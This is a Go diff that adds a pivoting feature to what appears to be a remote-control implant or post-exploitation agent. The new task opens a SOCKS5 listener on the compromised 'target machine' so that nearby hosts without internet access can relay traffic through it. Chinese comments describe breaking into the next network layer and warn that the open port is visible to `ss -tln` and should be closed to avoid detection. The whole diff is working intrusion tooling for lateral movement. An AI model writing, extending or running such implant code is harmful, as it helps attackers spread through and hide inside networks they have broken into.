@@ -410,6 +410,22 @@ func runTask(t *proto.Msg, hub *link.Hub) *proto.Msg {
 		bt.mu.Unlock()
 		res.OK = true
 		res.Stdout = "killed " + t.BgID
+	case proto.TaskSocksExpose:
+		if t.MuxOp == "close" {
+			if err := closeSocksExpose(t.Cmd); err != nil {
+				res.Err = err.Error()
+				return res
+			}
+			res.OK = true
+			res.Stdout = "socks expose closed: " + t.Cmd
+			return res
+		}
+		if err := serveSocksExpose(t.Cmd); err != nil {
+			res.Err = err.Error()
+			return res
+		}
+		res.OK = true
+		res.Stdout = "socks exposed on " + t.Cmd
 	case proto.TaskSocks:
 		if err := serveSocksOn(hub, t.MuxID); err != nil {
 			res.Err = err.Error()
@@ -647,12 +663,73 @@ var (
 	socksSess = map[uint32]*yamux.Session{}
 )
 
+// agent 侧暴露的 SOCKS 监听（addr -> listener）
+var (
+	exposeMu  sync.Mutex
+	exposeLns = map[string]net.Listener{}
+)
+
 func agentYamuxCfg() *yamux.Config {
 	c := yamux.DefaultConfig()
 	if *quiet {
 		c.LogOutput = io.Discard
 	}
 	return c
+}
+
+// serveSocksExpose 在 agent 本机网络监听一个 SOCKS5 端口（供同网段无出网主机经它回连）。
+// ⚠️ 与控制侧监听相反：这会**在目标机上开监听端口**（可被 `ss -tln` 看到），
+// 只在"打穿下一层、且该跳对抗等级可接受"时使用；用完应停掉。
+// closeSocksExpose 停掉一个 agent 侧暴露的 SOCKS 监听（收尾；别把端口留在目标机上）。
+func closeSocksExpose(addr string) error {
+	exposeMu.Lock()
+	ln := exposeLns[addr]
+	delete(exposeLns, addr)
+	exposeMu.Unlock()
+	if ln == nil {
+		return fmt.Errorf("expose: no listener at %s", addr)
+	}
+	return ln.Close()
+}
+
+func serveSocksExpose(addr string) error {
+	if addr == "" {
+		return fmt.Errorf("expose: empty listen address")
+	}
+	ln, err := net.Listen("tcp", addr)
+	if err != nil {
+		return err
+	}
+	exposeMu.Lock()
+	if old := exposeLns[addr]; old != nil {
+		_ = old.Close()
+	}
+	exposeLns[addr] = ln
+	exposeMu.Unlock()
+	logf("socks: exposed on %s (同网段主机可 -proxy socks5://<本机IP>:%d)", ln.Addr(), ln.Addr().(*net.TCPAddr).Port)
+	go func() {
+		defer func() {
+			exposeMu.Lock()
+			if exposeLns[addr] == ln {
+				delete(exposeLns, addr)
+			}
+			exposeMu.Unlock()
+			_ = ln.Close()
+			logf("socks: expose %s closed", addr)
+		}()
+		for {
+			c, err := ln.Accept()
+			if err != nil {
+				return
+			}
+			go func() {
+				_ = relay.Serve(c, func(nw, a string) (net.Conn, error) {
+					return net.DialTimeout(nw, a, 10*time.Second)
+				}, logf)
+			}()
+		}
+	}()
+	return nil
 }
 
 // serveSocksOn 在 mux 通道 muxID 上开 yamux 服务端并逐流跑 SOCKS5。
